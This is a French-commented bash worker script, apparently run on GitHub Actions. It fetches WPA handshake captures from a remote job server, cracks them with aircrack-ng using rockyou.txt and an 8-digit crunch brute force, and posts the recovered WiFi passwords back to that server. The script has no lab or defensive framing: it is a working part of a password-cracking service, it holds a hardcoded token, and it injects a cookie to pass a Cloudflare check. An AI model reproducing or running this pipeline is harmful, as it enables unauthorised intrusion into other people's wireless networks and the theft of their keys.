#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"

COOKIE_JAR="/tmp/byethost_cookies_$$.txt"

# ── Cookie statique depuis le secret GitHub ──────────────
# BYETHOST_COOKIE est passé via l'environnement GitHub Actions
# Valeur = la chaîne hexadécimale du cookie __test (sans le préfixe)
if [ -n "$BYETHOST_COOKIE" ]; then
    echo "[+] Cookie __test injecté depuis le secret GitHub"
    # On crée le cookie jar manuellement
    mkdir -p /tmp
    cat > "$COOKIE_JAR" <<EOF
# Netscape HTTP Cookie File
$(echo "${SITE_URL}" | sed 's|https://||;s|/.*||')	FALSE	/	TRUE	0	__test	${BYETHOST_COOKIE}
EOF
else
    echo "[-] Aucun cookie statique fourni"
fi
# ─────────────────────────────────────────────────────────

cleanup() {
    rm -f "$COOKIE_JAR" /tmp/check_result.txt capture_*.cap \
          result.txt wordlist_custom.txt 2>/dev/null
}
trap cleanup EXIT

# Wrapper curl avec le cookie
curl_api() {
    curl -s -b "$COOKIE_JAR" -A "$UA" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: en-US,en;q=0.9" \
        --max-time 30 \
        "$@"
}

curl_post() {
    curl -s -b "$COOKIE_JAR" -A "$UA" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: en-US,en;q=0.9" \
        --max-time 30 \
        -X POST --data-urlencode "$@"
}

report() {
    local msg="$1"
    local encoded
    encoded=$(echo "$msg" | sed 's/ /%20/g; s/é/e/g; s/è/e/g; s/ê/e/g; s/à/a/g; s/ù/u/g; s/ç/c/g; s/â/a/g; s/î/i/g; s/ô/o/g; s/û/u/g')
    curl -s -b "$COOKIE_JAR" -A "$UA" -o /dev/null \
        --max-time 30 \
        "${SITE_URL}/api_progress.php?token=${TOKEN}&job_id=${JOB_ID}&progress=${encoded}" \
        2>/dev/null || true
}

# ═════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║   WiFi Crack Worker - v2.3 (Cookie statique)        ║"
echo "║   $(date -u)                       ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 1 : Vérification des jobs"
echo "──────────────────────────────────────────────────────"
echo ""

RESPONSE=$(curl_api "${SITE_URL}/api_status.php?token=${TOKEN}")
echo "  Réponse brute : [${RESPONSE}]"
echo ""

if echo "$RESPONSE" | grep -qi "<html\|<script\|<body\|cf-browser-verify\|cf-chl\|challenge-platform"; then
    echo "❌ Cloudflare challenge détecté — le cookie est invalide ou expiré."
    echo "   Récupérez un nouveau cookie depuis https://wifi-wpa.byethost3.com/"
    echo "   et mettez à jour le secret BYETHOST_COOKIE dans GitHub."
    exit 0
fi

if [ -z "$RESPONSE" ]; then
    echo "❌ Réponse vide"
    exit 0
fi

if ! echo "$RESPONSE" | jq . >/dev/null 2>&1; then
    echo "❌ Réponse non-JSON : ${RESPONSE}"
    exit 0
fi

JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)
ESSID=$(echo "$RESPONSE" | jq -r '.job.essid // ""' 2>/dev/null)

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "✅ Aucune tâche en attente."
    exit 0
fi

echo "✅ Job #${JOB_ID} trouvé !"
echo "   ESSID : '${ESSID}'"
echo ""

# ── Téléchargement ──
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 2 : Téléchargement du .cap"
echo "──────────────────────────────────────────────────────"
echo ""

report "Telechargement du fichier"
curl_api -o "capture_${JOB_ID}.cap" \
    "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "❌ Fichier vide"
    report "Fichier vide"
    curl_post "id=${JOB_ID}&status=failed&password=" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
    exit 0
fi

SIZE=$(stat -c%s "capture_${JOB_ID}.cap" 2>/dev/null || wc -c < "capture_${JOB_ID}.cap" 2>/dev/null || echo "?")
echo "✅ Téléchargé : ${SIZE} octets"
report "Fichier telecharge (${SIZE} octets)"
echo ""

# ── Vérification handshake ──
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 3 : Vérification handshake"
echo "──────────────────────────────────────────────────────"
echo ""

aircrack-ng "capture_${JOB_ID}.cap" > /tmp/check_result.txt 2>&1
cat /tmp/check_result.txt
echo ""

if ! grep -q "WPA (1 handshake)" /tmp/check_result.txt; then
    echo "❌ Pas de handshake WPA valide"
    report "Pas de handshake valide"
    curl_post "id=${JOB_ID}&status=failed&password=" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
    rm -f "capture_${JOB_ID}.cap" /tmp/check_result.txt
    exit 0
fi

echo "✅ Handshake valide !"
echo ""

# ── Rockyou ──
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 4 : rockyou.txt"
echo "──────────────────────────────────────────────────────"
echo ""

report "Test rockyou.txt"

ARGS=""
[ -n "$ESSID" ] && ARGS="-e \"$ESSID\""

aircrack-ng -w /usr/share/wordlists/rockyou.txt $ARGS \
    "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
    echo "✅ Mot de passe trouvé (rockyou) : [${PWD}]"
    report "Mot de passe trouve"
    curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
    rm -f "capture_${JOB_ID}.cap" result.txt /tmp/check_result.txt wordlist_custom.txt 2>/dev/null
    exit 0
fi

echo "❌ Pas trouvé dans rockyou.txt"
echo ""

# ── Brute force 8 chiffres ──
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 5 : Force brute 8 chiffres"
echo "──────────────────────────────────────────────────────"
echo ""

report "Force brute 8 chiffres en cours"
echo "Génération wordlist avec crunch..."
crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    echo "Cracking en cours..."
    report "Force brute en cours"

    aircrack-ng -w wordlist_custom.txt $ARGS \
        "capture_${JOB_ID}.cap" > result.txt 2>&1

    if grep -q "KEY FOUND" result.txt; then
        PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
        echo "✅ Mot de passe trouvé (brute force) : [${PWD}]"
        report "Mot de passe trouve"
        curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" \
            "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true
        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt
        exit 0
    fi

    echo "❌ Force brute échec"
    report "Force brute echec"
else
    echo "❌ crunch n'a pas généré la wordlist"
    report "Crunch a echoue"
fi

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║  ❌ ÉCHEC — Mot de passe non trouvé                 ║"
echo "╚══════════════════════════════════════════════════════╝"

curl_post "id=${JOB_ID}&status=failed&password=" \
    "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt 2>/dev/null
echo "✅ Worker terminé."
